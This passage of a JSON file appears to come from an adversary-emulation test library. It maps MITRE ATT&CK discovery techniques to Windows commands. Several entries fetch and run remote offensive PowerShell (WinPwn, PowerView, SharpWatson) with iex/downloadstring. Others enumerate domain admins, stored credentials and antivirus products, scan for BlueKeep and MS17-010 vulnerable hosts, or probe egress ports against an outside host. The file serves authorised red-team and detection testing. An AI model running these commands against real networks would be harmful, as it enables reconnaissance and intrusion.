                    "command": "PathToAtomicsFolder\\T1482\\src\\TruffleSnout.exe forest -n %userdomain% && PathToAtomicsFolder\\T1482\\src\\TruffleSnout.exe domain -n %userdomain%",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "254a86c31338f406082b3c10ba35713d",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "f3c05269abfec53a1ea9b6d75dcce176": {
        "description": "Identify remote systems with net.exe.\n\nUpon successful execution, cmd.exe will execute `net.exe view` and display results of local systems on the network that have file and print sharing enabled.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net view /domain && net view",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "f3c05269abfec53a1ea9b6d75dcce176",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "57548b3eefc3c3d3eaf8c3b51380921a": {
        "description": "Start PowerUpSQL Checks using powerSQL function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); powerSQL -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "57548b3eefc3c3d3eaf8c3b51380921a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "1d46ffd997d1722c5b26b7b1db282454": {
        "description": "This is to test for what ports are open outbound.  The technique used was taken from the following blog:\nhttps://www.blackhillsinfosec.com/poking-holes-in-the-firewall-egress-testing-with-allports-exposed/\n\nUpon successful execution, powershell will read top-128.txt (ports) and contact each port to confirm if open or not. Output will be to Desktop\\open-ports.txt.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -ErrorAction ignore \"$env:USERPROFILE\\Desktop\\open-ports.txt\"",
                    "command": "$ports = Get-content 88a14d_top-128.txt; $file = \"$env:USERPROFILE\\Desktop\\open-ports.txt\"; $totalopen = 0; $totalports = 0; New-Item $file -Force; foreach ($port in $ports) {;     $test = new-object system.Net.Sockets.TcpClient;     $wait = $test.beginConnect(\"allports.exposed\", $port, $null, $null);     $wait.asyncwaithandle.waitone(250, $false) | Out-Null;     $totalports++ | Out-Null;     if ($test.Connected) {;         $result = \"$port open\" ;         Write-Host -ForegroundColor Green $result;         $result | Out-File -Encoding ASCII -append $file;         $totalopen++ | Out-Null;     };     else {;         $result = \"$port closed\" ;         Write-Host -ForegroundColor Red $result;         $totalclosed++ | Out-Null;         $result | Out-File -Encoding ASCII -append $file;     }; }; $results = \"There were a total of $totalopen open ports out of $totalports ports tested.\"; $results | Out-File -Encoding ASCII -append $file; Write-Host $results",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": [
                        "88a14d_top-128.txt"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "1d46ffd997d1722c5b26b7b1db282454",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a3c8fba61f02a7b96306b87121b2ac4b": {
        "description": "Check domain Group policies for common misconfigurations using Grouper2 via GPOAudit function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPOAudit -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a3c8fba61f02a7b96306b87121b2ac4b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e541c2b62c3259680863a6f3b410e59a": {
        "description": "Utilizing PowerShell cmdlet - get-wmiobject, to enumerate local groups on the endpoint. Upon execution, Upon execution, information will be displayed of local groups on system.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-WMIObject Win32_Group",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e541c2b62c3259680863a6f3b410e59a",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "a3e8892b98d8fb77faca916f64439b69": {
        "description": "Compiles and executes C# code to list main window titles associated with each process.\n\nUpon successful execution, powershell will download the .cs from the Atomic Red Team repo, and cmd.exe will compile and execute T1010.exe. Upon T1010.exe execution, expected output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1010",
            "name": "Application Window Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "del /f /q /s %TEMP%\\T1010.exe >nul 2>&1",
                    "command": "C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\csc.exe -out:%TEMP%\\T1010.exe 1b4409_T1010.cs && %TEMP%\\T1010.exe",
                    "payloads": [
                        "1b4409_T1010.cs"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "a3e8892b98d8fb77faca916f64439b69",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "9381d0e0efbf5bf89a9e512f8b3745f4": {
        "description": "Search for bluekeep vulnerable Windows Systems in the domain using bluekeep function of WinPwn. Can take many minutes to complete (~600 seconds in testing on a small domain).",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); bluekeep -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "9381d0e0efbf5bf89a9e512f8b3745f4",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "b5b9bf30b09bf2f3367effa3022e7aa7": {
        "description": "Identify all environment variables. Upon execution, environments variables and your path info will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "set",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "b5b9bf30b09bf2f3367effa3022e7aa7",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "33a24ff44719e6ac0614b58f8c9a7c72": {
        "description": "Discovery of an installed Sysinternals Sysmon service using driver altitude (even if the name is changed).\n\nwhen sucessfully executed, the test is going to display sysmon driver instance if it is installed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "fltmc.exe | findstr.exe 385201",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "33a24ff44719e6ac0614b58f8c9a7c72",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "13a0c78dbd8d3645db69540bfe7cd038": {
        "description": "Powershell script that runs nslookup on cmd.exe against the local /24 network of the first network adaptor listed in ipconfig.\n\nUpon successful execution, powershell will identify the ip range (via ipconfig) and perform a for loop and execute nslookup against that IP range. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$localip = ((ipconfig | findstr [0-9].\\.)[0]).Split()[-1]; $pieces = $localip.split(\".\"); $firstOctet = $pieces[0]; $secondOctet = $pieces[1]; $thirdOctet = $pieces[2]; foreach ($ip in 1..255 | % { \"$firstOctet.$secondOctet.$thirdOctet.$_\" } ) {cmd.exe /c nslookup $ip}",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "13a0c78dbd8d3645db69540bfe7cd038",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "2594698a8e38a85b0d98468d87b49821": {
        "description": "Utilizing PowerView, run Get-DomainGroupMember to identify domain users. Upon execution, progress and info about groups within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainGroupMember \"Domain Admins\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "2594698a8e38a85b0d98468d87b49821",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "cfb61005899996469ae3023796792ca5": {
        "description": "Uses the nltest command to discover domain trusts.\nRequires the installation of nltest via Windows RSAT or the Windows Server AD DS role.\nThis technique has been used by the Trickbot malware family.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "nltest /domain_trusts",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "cfb61005899996469ae3023796792ca5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ceebaaf57829c53dbfef1fbc785c0b10": {
        "description": "Adfind tool can be used for reconnaissance in an Active directory environment. This example has been documented by ransomware actors enumerating Active Directory Domain Controller Objects\nreference- http://www.joeware.net/freetools/tools/adfind/, https://www.fireeye.com/blog/threat-research/2019/04/pick-six-intercepting-a-fin6-intrusion.html\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "12011c_AdFind.exe -sc dclist",
                    "payloads": [
                        "12011c_AdFind.exe"
                    ]
                }
            }
        },
        "id__dependence__fact": [
            "ceebaaf57829c53dbfef1fbc785c0b10",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "1ce4819818f5cc864031572127c111cf": {
        "description": "The Get-GPO cmdlet gets one Group Policy Object (GPO) or all the GPOs in a domain. Tested on Windows Server 2019 as a domain user with computer joined to domain. Reference: https://docs.microsoft.com/en-us/powershell/module/grouppolicy/get-gpo?view=windowsserver2022-ps",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "del $env:temp\\GPO_Output.txt -erroraction silentlycontinue",
                    "command": "Get-GPO -Domain $ENV:userdnsdomain -All >> $env:temp\\GPO_Output.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "1ce4819818f5cc864031572127c111cf",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "221d4ebcb41e708b6ee90c1c0369a969": {
        "description": "Use the PowerShell \"GetCurrent\" method of the WindowsIdentity .NET class to identify the logged user.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1033",
            "name": "System Owner/User Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item -Path .\\CurrentUserObject.txt -Force",
                    "command": "[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "221d4ebcb41e708b6ee90c1c0369a969",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e528524d6a3cddaaddc89fcc719e2a3f": {
        "description": "Enumerate all accounts via PowerShell. Upon execution, lots of user account and group information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.001",
            "name": "Account Discovery: Local Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "net user; get-localuser; get-localgroupmember -group Users; cmdkey.exe /list; ls C:/Users; get-childitem C:\\Users\\; dir C:\\Users\\; get-localgroup; net localgroup",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e528524d6a3cddaaddc89fcc719e2a3f",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "8e3aa35f5727b48ec9666b444f9d1cdf": {
        "description": "ADRecon extracts and combines information about an AD environement into a report. Upon execution, an Excel file with all of the data will be generated and its\npath will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "Remove-Item $env:TEMP\\ADRecon.ps1 -Force -ErrorAction Ignore | Out-Null; Get-ChildItem $env:TEMP -Recurse -Force | Where{$_.Name -Match \"^ADRecon-Report-\"} | Remove-Item -Force -Recurse",
                    "command": "Invoke-Expression $env:TEMP\\ADRecon.ps1",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "8e3aa35f5727b48ec9666b444f9d1cdf",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "ee41528024c63881b53302e996a79020": {
        "description": "Enumerate all accounts\nUpon exection, multiple enumeration commands will be run and their output displayed in the PowerShell session\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net user /domain && net group /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ee41528024c63881b53302e996a79020",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "548dc737f7e316338a51a0860bd9a89a": {
        "description": "Runs \"net group\" command including command aliases and loose typing to simulate enumeration/discovery of high value domain groups. This\ntest will display some errors if run on a computer not connected to a domain. Upon execution, domain information will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net group /domai \"Domain Admins\" && net groups \"Account Operators\" /doma && net groups \"Exchange Organization Management\" /doma && net group \"BUILTIN\\Backup Operators\" /doma",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "548dc737f7e316338a51a0860bd9a89a",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "286916316d725933021d57fb5620d644": {
        "description": "PowerSharpPack - Watson searching for missing windows patches  technique via function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-SharpWatson.ps1'); Invoke-watson",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "286916316d725933021d57fb5620d644",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "53f5c5712bf6c008a24c38fe60700d2e": {
        "description": "Utilizing wmic.exe to enumerate groups on the local system. Upon execution, information will be displayed of local groups on system.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.001",
            "name": "Permission Groups Discovery: Local Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "wmic.exe group get name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53f5c5712bf6c008a24c38fe60700d2e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "7d8ee68f0e9731db82964f558f614608": {
        "description": "Identify network configuration information\n\nUpon successful execution, cmd.exe will spawn multiple commands to list network configuration settings. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1016",
            "name": "System Network Configuration Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "ipconfig /all && netsh interface show interface && arp -a && nbtstat -n && net config",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "7d8ee68f0e9731db82964f558f614608",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "a2946687ae1138d23b0dc040e43d0eb5": {
        "description": "This test will enumerate the details of the built-in domain admin account\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1087.002",
            "name": "Account Discovery: Domain Account"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "net user administrator /domain",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "a2946687ae1138d23b0dc040e43d0eb5",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "ac20e592bc912bddff4d6b88289095f0": {
        "description": "Identify domain controllers for specified domain.\n\nUpon successful execution, cmd.exe will execute nltest.exe against a target domain to retrieve a list of domain controllers. Output will be via stdout.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "nltest.exe /dclist:%userdnsdomain%",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "ac20e592bc912bddff4d6b88289095f0",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "76147189e1a5880afa047d0869cf6d17": {
        "description": "Discovery of installed antivirus products via a WMI query.\n\nwhen sucessfully executed, the test is going to display installed AV software.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518.001",
            "name": "Software Discovery: Security Software Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "wmic.exe /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "76147189e1a5880afa047d0869cf6d17",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "92e90026cd811e2509d57e586867883b": {
        "description": "This tool enables enumeration and exporting of all DNS records in the zone for recon purposes of internal networks\nPython 3 and adidnsdump must be installed, use the get_prereq_command's to meet the prerequisites for this test.\nSuccessful execution of this test will list dns zones in the terminal.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1018",
            "name": "Remote System Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "adidnsdump -u domain\\user -p password --print-zones 192.168.1.1",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "92e90026cd811e2509d57e586867883b",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "abc25aecd2ed0524af31e79add29cc43": {
        "description": "Searches for Google Chrome's and Opera's Bookmarks file (on Windows distributions) that contains bookmarks.\nUpon execution, paths that contain bookmark files will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1217",
            "name": "Browser Bookmark Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "Get-ChildItem -Path C:\\Users\\ -Filter Bookmarks -Recurse -ErrorAction SilentlyContinue -Force",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "abc25aecd2ed0524af31e79add29cc43",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "3fc35f10c72ccb131d55242e66ea1d0b": {
        "description": "This test emulates MAZE ransomware's ability to enumerate directories using Powershell. \nUpon successful execution, this test will output the directory enumeration results to a specified file, as well as display them in the active window. \nSee https://www.mandiant.com/resources/tactics-techniques-procedures-associated-with-maze-ransomware-incidents\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1083",
            "name": "File and Directory Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "remove-item $env:temp\\T1083Test5.txt -ErrorAction SilentlyContinue",
                    "command": "$folderarray = @(\"Desktop\", \"Downloads\", \"Documents\", \"AppData/Local\", \"AppData/Roaming\"); Get-ChildItem -Path $env:homedrive -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path $env:programfiles -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; Get-ChildItem -Path \"${env:ProgramFiles(x86)}\" -erroraction silentlycontinue | Out-File -append $env:temp\\T1083Test5.txt; $UsersFolder = \"$env:homedrive\\Users\\\"; foreach ($directory in Get-ChildItem -Path $UsersFolder -ErrorAction SilentlyContinue) ; {; foreach ($secondarydirectory in $folderarray);  {Get-ChildItem -Path \"$UsersFolder/$directory/$secondarydirectory\" -ErrorAction SilentlyContinue | Out-File -append $env:temp\\T1083Test5.txt}; }; cat $env:temp\\T1083Test5.txt",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3fc35f10c72ccb131d55242e66ea1d0b",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "834e861bba95b87d066e84c5c6b056a0": {
        "description": "Enumerate remote access policies through group policy using GPORemoteAccessPolicy function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1615",
            "name": "Group Policy Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); GPORemoteAccessPolicy -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "834e861bba95b87d066e84c5c6b056a0",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "0954576f69ca8e140f2cdc9e58b36ff9": {
        "description": "Search for .NET Service-Binaries on this system via winpwn dotnet function of WinPwn.",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1518",
            "name": "Software Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); dotnet -consoleoutput -noninteractive",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "0954576f69ca8e140f2cdc9e58b36ff9",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "53571e9988b92014f9d71888936d3878": {
        "description": "Utilizing PowerView, run Get-DomainTrust to identify domain trusts. Upon execution, progress and info about trusts within the domain being scanned will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1482",
            "name": "Domain Trust Discovery"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Get-DomainTrust -Verbose",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "53571e9988b92014f9d71888936d3878",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "d2b459d6fa4aa8fa31e745e1b3d737c3": {
        "description": "identifies DCRat delay time tactics using w32tm.\nhttps://research.splunk.com/endpoint/b2cc69e7-11ba-42dc-a269-59c069a48870/\nhttps://blogs.blackberry.com/en/2022/05/dirty-deeds-done-dirt-cheap-russian-rat-offers-backdoor-bargains\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1124",
            "name": "System Time Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "W32tm /stripchart /computer:localhost /period:5 /dataonly /samples:2",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "d2b459d6fa4aa8fa31e745e1b3d737c3",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "3b76cb7e6fe373d4553f60bb34982a4c": {
        "description": "takes a computer and determines who has admin rights over it through GPO enumeration. Upon execution, information about the machine will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; IEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Find-GPOComputerAdmin -ComputerName $env:COMPUTERNAME -Verbose\"",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "3b76cb7e6fe373d4553f60bb34982a4c",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "e958169f1efe85a5a5ea7a77eba8c29e": {
        "description": "Search for MS17-10 vulnerable Windows Servers in the domain using powerSQL function of WinPwn",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1046",
            "name": "Network Service Scanning"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t'; iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'); MS17-10 -noninteractive -consoleoutput",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
                            }
                        ]
                    },
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "e958169f1efe85a5a5ea7a77eba8c29e",
            "None",
            "validate_me"
        ],
        "plugin": "atomic"
    },
    "dca8b042fcdffcc1f5cddcff4122c434": {
        "description": "Identify System Info. Upon execution, system info and time info will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1082",
            "name": "System Information Discovery"
        },
        "platforms": {
            "windows": {
                "cmd": {
                    "cleanup": "",
                    "command": "systeminfo && reg query HKLM\\SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
                    "payloads": []
                }
            }
        },
        "id__dependence__fact": [
            "dca8b042fcdffcc1f5cddcff4122c434",
            "None",
            "None"
        ],
        "plugin": "atomic"
    },
    "775710727daed64ab5c67e0ac394ae87": {
        "description": "Permission Groups Discovery utilizing PowerShell. This test will display some errors if run on a computer not connected to a domain. Upon execution, domain\ninformation will be displayed.\n",
        "tactic": "discovery",
        "technique": {
            "attack_id": "T1069.002",
            "name": "Permission Groups Discovery: Domain Groups"
        },
        "platforms": {
            "windows": {
                "psh": {
                    "cleanup": "",
                    "command": "get-ADPrincipalGroupMembership administrator | select name",
                    "parsers": {
                        "plugins.atomic.app.parsers.atomic_powershell": [
                            {
                                "source": "validate_me"
